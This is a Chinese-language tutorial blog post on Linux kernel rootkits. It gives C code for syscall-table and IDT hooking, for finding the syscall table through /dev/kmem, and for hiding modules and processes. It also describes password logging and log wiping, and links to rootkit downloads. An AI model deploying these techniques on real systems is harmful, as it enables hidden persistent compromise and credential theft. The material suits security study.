CSysSec注： 本文来自Diting0x的个人博客，分析了Linux下不同类型的rootkit、相关原理以及源码分析，值得推荐。  
转载本文请务必注明，文章出处：《[Rootkit综合教程](http://www.csyssec.org/20170102/rootkittutorial/)》与作者信息：Diting0x  

## 0x01 Definition of rootkit

The term rootkit originates from the composition of the individual terms root, referring to the highest privilege of access that can be obtained in a traditional Unix-based operating system, and kit, referring to a set of programs that are designed to exploit a target system, gain root access and then maintain it without tripping any alarms.  

简而言之，rootkit是攻击者向计算机系统中植入的，能够隐藏自身踪迹并保留超级用户权限的恶意程序。与worms，virus不同的是，rootkit基于攻击者已经拿到root权限之后对系统进行破坏。rootkit会尽可能通过隐藏文件、进程、模块、进程等信息避免被监控程序检测。  

## 0x02 Classification of Rootkit

早期的rootkit主要为应用级rootkit，应用级rootkit主要通过替换login、ps、ls、netstat等系统工具,或者修改一些系统配置文件、脚本来实现隐藏及后门. 然而应用层rootkit比较容易检测，比如基于ring 3的chkrootkit检测工具。后期逐渐演变成内核rootkit,hypervisor rootkit以及硬件级rootkit. 内核rootkit可分为hooking rootkit以及DKOM rootkit。 下面就先来具体介绍这两种kernel rootkit。 hypervisor以及硬件级rootkit本文不做具体介绍，想了解更详细的rootkit分类，可参考这篇文章：[Introducing Stealth Malware Taxonomy](http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf)  

## 0x03 Hooking(Kernel Object Hooking) Rootkit

Hooking rootkit 主要基于lkm(loadable kernel module)技术，以可加载内核模块的形式通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过hook系统调用等技术实现隐藏、后门功能，这时，rootkit便是内核的一个模块。  

注：lkm is an object file that contains code to extend the running kernel, or so-called base kernel, of an operating system. lkm中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。lkm的优点在于可以动态地加载到内存中，无须重新编译内核, 所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。关于lkm更多的知识，可参考[Complete Linux Loadable Kernel Modules](https://www.thc.org/papers/LKM_HACKING.html) , 文章中也有与系统调用劫持相关的代码分析，下文会继续提到。lkm只是hooking rootkit的存在形式，而真正的技术在于如何hooking.  

什么是hooking ? 来自wikipedia的解释： the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a “hook”. 假如正常执行的情况是 Funtion A -> Funtion B, 经过hooking之后的执行就变为 Funtion A -> Hook -> Funtion B.  

Hooking rootkit主要的hook对象是系统调用，也包括VFS函数劫持(如adore-ng),下文会提到。当应用程序发起系统调用(比如 open()打开文件)时，整个程序控制流就像这样：  

1). 触发中断，然后程序在中断处理器（interrupt handler)定义的中断中继续执行。在Linux上，INT 80指令用来触发中断。  

这时，rootkit可以用自己的函数替换内核的中断处理器。这需要修改IDT(Interrupt Descriptor Table). 具体修改代码下文还会继续提到。  

2). 中断处理器在syscall table中查询被请求的syscall的地址，将执行跳转到该地址中。  

a 这时，rootkit可以修改中断处理器而使用另一个syscall table, 这种类型的rootkit相对较少，可参考 Suckit， 文章Phrack issue 58, article 0x07 (“[Linux on-the-fly kernel patching without LKM](http://phrack.org/archives/issues/58/7.txt)”有具体描述.这种方式属于DKOM rootkit, 下文会详细讲解。  

b 也可以只修改syscall table的入口地址，将其替换为rootkit自己的函数. 大部分的rootkit都采取这种方式，如adore-ng, knark, synapsis等。  

3). 执行系统调用函数， 控制权返回到应用程序。  
这时，rootkit也可以重写系统调用函数，在函数起始处放置jump，跳转到自己的函数中。  

但很少有rootkit采用这种方法。  

对于2).b 类型的rootkit， 可参考以下代码  

``` c
#define MODULE
#define __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <asm/fcntl.h>
#include <asm/errno.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <sys/mman.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/malloc.h>
extern void* sys_call_table[];       /*sys_call_table is exported, so we
                                     can access it*/               
int (*orig_mkdir)(const char *path); /*the original systemcall*/
int hacked_mkdir(const char *path)
{
 return 0;                           /*everything is ok, but he new systemcall
                                     does nothing*/
}
int init_module(void)                /*module setup*/
{
 orig_mkdir=sys_call_table[SYS_mkdir];
 sys_call_table[SYS_mkdir]=hacked_mkdir;
 return 0;
}
void cleanup_module(void)            /*module shutdown*/
{
 sys_call_table[SYS_mkdir]=orig_mkdir; /*set mkdir syscall to the origal
                                       one*/
}
```
注意，要对系统调用(sys_call_table)进行替换，却必须要获取该地址后才可以进行替换。但是Linux 2.6版的内核出于安全的考虑没有将系统调用列表基地址的符号sys_call_table导出，但是我们可以采取一些hacking的方式进行获取。  
因为系统调用都是通过0x80中断来进行的，故可以通过查找0x80中断的处理程序来获得sys_call_table的地址。其基本步骤是：  

1. 获取中断描述符表(IDT)的地址(使用C ASM汇编)
2. 从中查找0x80中断(系统调用中断)的服务例程(8*0x80偏移)
3. 搜索该例程的内存空间，
4. 从其中获取sys_call_table(保存所有系统调用例程的入口地址)的地址

有关获取IDT表地址的代码：  

``` c
unsigned long get_addr_idt (void)
        {
         unsigned char idtr[6];
         unsigned long idt;
        __asm__ volatile ("sidt %0": "=m" (idtr));
        idt = *((unsigned long *) &idtr[2]);
        return(idt);
        }
```
获取syscall table地址的方法还有许多，更多可参考 [Linux System Calls Hooking Method Summary](http://www.cnblogs.com/LittleHann/p/3854977.html) 。  

对于 1)类型的rootkit相当于将系统调用的hook转移到了 对80中断的hook，具体可参考 [Rootkit Hacking Technology && Defence Strategy Research](http://www.cnblogs.com/LittleHann/p/3910696.html)   
以及  
[Phrack issue 59, article 0x04 (“Handling the Interrupt Descriptor Table”)](http://www.phrack.org/archives/issues/59/4.txt)  

相关代码如下：  
``` c

/*
1. 通过"中断寄存器"获取中断描述符表(IDT)的地址(使用C ASM汇编)
*/
asm("sidt %0":"=m"(idt48));
/*
2. 从中查找0x80中断("0x80中断"就是"系统调用中断")的服务例程(8*0x80偏移)
"中断描述符表(IDT)"中有很多项，每项8个字节，而第0x80项才是系统调用对应的中断
struct descriptor_idt
{
        unsigned short offset_low;
        unsigned short ignore1;
        unsigned short ignore2;
        unsigned short offset_high;
};
static struct 
{
        unsigned short limit;
        unsigned long base;
}__attribute__ ((packed)) idt48;
*/
pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
system_call_addr = (pIdt80->offset_high << 16 | pIdt80->offset_low);
/*
3. 搜索该例程的内存空间，获取"系统调用函数表"的地址("系统调用函数表"根据系统调用号作为索引保存了linux系统下的所有系统调用的入口地址)
*/
for (i=0; i<100; i++)
{
    if (p=='\xff' && p[i+1]=='\x14' && p[i+2]=='\x85')
    {
        sys_call_table = *(unsigned int*)(p+i+3);
        printk("addr of sys_call_table: %x\n", sys_call_table);
        return ;
    } 
}
/*
4. 将sys_call_table作为基址，根据系统调用号作为索引，获取指定的系统调用的函数地址指针，因为我们通过劫持80中断进而达到系统调用劫持的目的后，还需要将代码控制流重新导向原始的系统调用
*/
orig_read = sys_call_table[__NR_read]; 
orig_getdents64 = sys_call_table[__NR_getdents64];
..
replace
..
/*
5. 直接替换IDT中的某一项，也就是我们需要通过代码模拟原本"系统调用中断例程(IDT[0x80])"的代码逻辑
*/
void new_idt(void)
{
        ASMIDType
        (
                "cmp %0, %%eax      \n"
                "jae syscallmala        \n"
                "jmp hook               \n"
                "syscallmala:           \n"
                "jmp dire_exit          \n"
                : : "i" (NR_syscalls)
        );
}
..
void hook(void)
{
    register int eax asm("eax");
    switch(eax)
    {
        case __NR_getdents64:
            CallHookedSyscall(Sys_getdents64);
            break;
        case __NR_read:
            CallHookedSyscall(Sys_read);
               break; 
        default:
            JmPushRet(dire_call);
           break;
    } 
    //jmp to original syscall idt handler 
    JmPushRet( after_call );
}
```

## 0X04 DKOM Rootkit

DKOM means direct kernel object manipulation-直接内核对象操作。所有的操作系统(linux、windows)都会把内核中的运行状态(包括进程信息、系统内核状态)这些数据以对象的形式保存下来，包括:结构体、队列与数组。这些内核状态信息往往保存在内核空间的某个地址段中，当我们通过系统向内核查询这些”内核状态信息”(运行进程的列表、开放的端口等)时，这些数据就被解析并返回。因为这些数据是保存在内存中的，所以可以直接去操作它们。 其主要利用/dev/kmem技术。  

什么是/dev/kmem? 指的是kernel看到的虚拟内存的全镜像。可以用来访问kernel的内容，查看kernel的变量，也是DKOM rootkit的目标对象。注意还有个设备叫做/dev/mem,这是物理内存的全镜像，可以用来访问物理内存。  

以下是DKOM rootkit利用/dev/kmem来获取syscall table地址的代码：  
``` c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
struct {
        unsigned short limit;
        unsigned int base;
} __attribute__ ((packed)) idtr;
struct {
        unsigned short off1;
        unsigned short sel;
        unsigned char none,flags;
        unsigned short off2;
} __attribute__ ((packed)) idt;
int kmem;
void readkmem (void *m,unsigned off,int sz)
{
        if (lseek(kmem,off,SEEK_SET)!=off) {
                perror("kmem lseek"); exit(2);
        }
        if (read(kmem,m,sz)!=sz) {
                perror("kmem read"); exit(2);
        }
}
#define CALLOFF 100     /* we'll read first 100 bytes of int $0x80*/
main ()
{
        unsigned sys_call_off;
        unsigned sct;
        char sc_asm[CALLOFF],*p;
        /* well let's read IDTR */
        asm ("sidt %0" : "=m" (idtr));
        printf("idtr base at 0x%X\n",(int)idtr.base);
        /* now we will open kmem */
        kmem = open ("/dev/kmem",O_RDONLY);
        if (kmem<0) return 1;
        /* read-in IDT for 0x80 vector (syscall) */
        readkmem (&idt,idtr.base+8*0x80,sizeof(idt));
        sys_call_off = (idt.off2 << 16) | idt.off1;
        printf("idt80: flags=%X sel=%X off=%X\n",
                (unsigned)idt.flags,(unsigned)idt.sel,sys_call_off);
        /* we have syscall routine address now, look for syscall table
           dispatch (indirect call) */
        readkmem (sc_asm,sys_call_off,CALLOFF);
        p = (char*)memmem (sc_asm,CALLOFF,"\xff\x14\x85",3);
        sct = *(unsigned*)(p+3);
        if (p) {
                printf ("sys_call_table at 0x%x, call dispatch at 0x%x\n",
                        sct, p);
        }
        close(kmem);
}
```
获取syscall table后，可以将整个syscall table替换为rootkit的syscall table， 也是前文提到的Suckit 的攻击方式。  

## 0x05 Rootkit Objectives

1. 隐藏文件    
通过strace ls可以发现ls命令其实是通过sys_getdents64获得文件目录的，因此可以通过修改sys_getdents64系统调用或者更底层的readdir实现隐藏文件及目录  

2. 隐藏进程   
隐藏进程的方法和隐藏文件类似，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果，即hook sys_getdents64和readdir等。  

3. 隐藏连接  
netstat命令是通过读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。  

4. 隐藏模块  
lsmod命令主要是通过sys_query_module系统调用获得模块信息，可以通过hook sys_query_module系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果  

5. 嗅探工具  
* 嗅探工具可以通过libpcap库直接访问链路层，截获数据包  
* 也可以通过linux的netfilter框架在IP层的hook点上截获数据包  
嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过ioctl系统调用的SIOCSIFFLAGS命令实现的，查看网卡的当前模式是通过SIOCGIFFLAGS命令，因此可以通过hook sys_ioctl隐藏网卡的混杂模式   

6. 密码记录
密码记录可以通过hook sys_read系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。hook sys_read还可以实现login后门等其它功能  

7. 日志擦除
传统的unix日志主要在  
* /var/log/messages  
* /var/log/lastlog  
* /var/run/utmp  
* /var  
* /log/wtmp下  
可以通过编写相应的工具对日志文件进行修改，还可以将HISTFILE等环境变设为/dev/null隐藏用户的一些操作信息  

8. 内核后门
* 本地的提权后门  
本地的提权可以通过对内核模块发送定制命令实现  
* 网络的监听后门  
网络内核后门可以在IP层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程  

## 0x06 Example-Module Hiding

在linux中，编写的内核模块通过insmod（实际上是执行了init_module系统调用）命令插入到内核中，模块便与一个struct module 结构体相关联，并成为内核的一部分。所有的内核模块都被维护在一个全局链表中，链表头是个全局变量struct module *modules. 任何一个新创建的模块，都会被加入到这个链表的头部，通过modules->next引用。要枚举module的方法有许多种：  
a）.VFS方法: cat /proc/module: 直接读取/proc/module下的项;   
b). ring3方法: lsmod: 本质还是在读取/proc/module，做了一个代码封装，提供给用户一个良好的接口和界面;  
c). LKM方法: 直接通过kernel module枚举struct module->list;   
d). LKM方法: 直接通过kernel module枚举struct module->mkobj->kobj->entry;   
e).lKM方法: 直接通过kernel module枚举module->mkobj->kobj->kset.    

下面介绍采用断链法技术进行内核模块隐藏的代码：   

``` c
/*
MODULE HELPERS
使用"断链法"技术进行内核模块的隐藏
原理:
1. linux将所有的内核模块都在内核中用循环双链表串联起来了
2. 通过找到这些链表，并使用linux提供的链表操作宏将指定的"元素(对应内核模块)"从链表中断开
3. 我们再通过lsmod、或者直接读取内核模块链表的时候自然无法枚举到被我们隐藏的模块了，达到隐藏模块的目的
关于内核模块链表的相关知识请参阅
http://www.cnblogs.com/LittleHann/p/3865490.html
*/
void module_hide(void)
{
    if (module_hidden) 
    {
        return;
    }
    /*
    从struct module结构体可以看出，在内核态，我们如果要枚举当前模块列表，可以使用list、kobj这两个成员域进行枚举
    自然在断链隐藏的时候也需要对这两个成员进行操作
    */
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}
```
有关LKM模块隐藏还可参考： [Linux Rootkit系列一：LKM的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)  

## 0x07 Example-Process Hiding

上文提到，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果。
以下是基于/proc目录读取函数劫持的进程隐藏代码：  
``` c
static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
    proc_filldir_orig = filldir;
    return proc_readdir_orig(filp, dirent, proc_filldir_new);
}
//CALLBACK SECTION
static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    int i;
    for (i=0; i < current_pid; i++) 
    {
        /*
        当检测到指定的需要隐藏的进程时，直接returned返回，即直接跳过这个进程的枚举
        */
        if (!strcmp(name, pids_to_hide[i])) 
        {
            return 0;
        } 
    }
    if (!strcmp(name, "rtkit")) 
    {
        return 0;
    }
    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}
```
## 0x08 Rootkit Sample

1). adore-ng(lkm)。adore-ng不修改系统调用层的内容，而是通过修改VFS（Virtual Filesystem Switch)层的具体处理函数，如替换VFS层的 file_ops等函数，来实现信息隐藏目的。原理细节可参考：[adore-ng learning](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform). 下载： [adore-ng 0.41](https://packetstormsecurity.com/files/32843/adore-ng-0.41.tgz.html), [adore-ng github for linux 2.6 and 3.x](https://github.com/chonghw/adore-ng)  

2). knark(Hooking system call). 行为：隐藏或显示文件或目录； 隐藏TCP或UDP连接；程序执行重定向；非授权地用户权限增加(“rootme”)； 改变一个运行进程的UID/GID的工具；非授权地、特权程序远程执行守护进程(后门端口)；Kill –31: 隐藏运行的进程；调用表修改: rootkit通过修改导出的系统调用表，对与攻击行为相关的系统调用进行替换，隐藏攻击者的行踪。 原理细节可参考： [kark learning](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform) .下载：[knark download](https://packetstormsecurity.com/files/24853/knark-2.4.3.tgz.html)  

3).suckit. 行为：采用动态隐藏的方式来隐藏指定的内容，包括文件、进程、以及网络连接。suckit不同于其它基于lkm的hooking rootkit，没有修改系统调用表的内容，而是首先拷贝了系统调用表，然后将拷贝的系统调用表按照攻击者的意图进行修改执行攻击者改写的系统调用响应函数,然后将system_call（INT 80服务程序)从旧的系统调用表上移开，指向新的系统调用表. 有关suckit原理详细介绍，可参考: [suckit learning](http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf)。 下载：[suckit download](https://packetstormsecurity.com/files/40690/suckit2priv.tar.gz.html)  

其它rootkit samples还包括：[enyelkm](https://github.com/David-Reguera-Garcia-Dreg/enyelkm)，[wnps](http://www.cnblogs.com/LittleHann/p/3879961.html#commentform)， [brootkit](https://github.com/cloudsec/brootkit)（其中brootkit详细介绍可参考[brookit analysis](http://www.cnblogs.com/LittleHann/p/4321826.html)）， [xingyiquan](https://packetstormsecurity.com/files/128945/Xingyiquan-Linux-2.6.x-3.x-Rootkit.html)，[synapsys](https://packetstormsecurity.com/files/24482/Synapsys-lkm.tar.gz.html) 。  